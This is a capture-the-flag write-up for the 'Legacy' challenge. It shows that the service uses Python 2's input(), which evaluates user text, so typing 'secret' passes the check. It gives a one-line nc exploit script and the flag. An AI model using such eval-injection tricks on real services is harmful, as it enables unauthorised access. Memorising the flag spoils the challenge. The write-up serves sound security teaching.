# Legacy

## Challenge

Connecting to the challenge prompts us to guess a number.

```
$ nc 0.cloud.chals.io 28964
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
```
Entering 1 or 2 guesses seems to have no affect.

Once a third guess is entered, we get a response:

```
$ nc 0.cloud.chals.io 28964
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
1111111111
111111111111111
1111111111111
3 chances left! 
2 chances left! 
1 chances left! 
Deprecated shmeprecated!
Python 2 will never die!
```

This is probably due to buffering, the intended affect is probably that the responses are interleaved with the guesses.
This has no affect on the challenge.

## Solution

If we enter something that is not a number, such as just a newline, we get the following response:

```
$ nc 0.cloud.chals.io 28964
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!

3 chances left! 
Traceback (most recent call last):
  File "/home/ctf/legacy.py", line 15, in <module>
    if (input(str(3-i) + " chances left! \n") == secret):
  File "<string>", line 0
    
    ^
SyntaxError: unexpected EOF while parsing
```

This seems to confirm that the challenge is using the `input` function in Python2.

This function is dangerous as it evaluates the input rather than treating it as a string.
For example, we can make our input equal `secret` simply by typing the word "secret" as our response:

```
$ nc 0.cloud.chals.io 28964
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
secret
3 chances left! 
No way!
UMDCTF{W3_H8_p7th0n2}
```

## Exploit

```bash
#!/usr/bin/bash
echo "secret" | nc 0.cloud.chals.io 28964
```

## Flag

```
UMDCTF{W3_H8_p7th0n2}
```
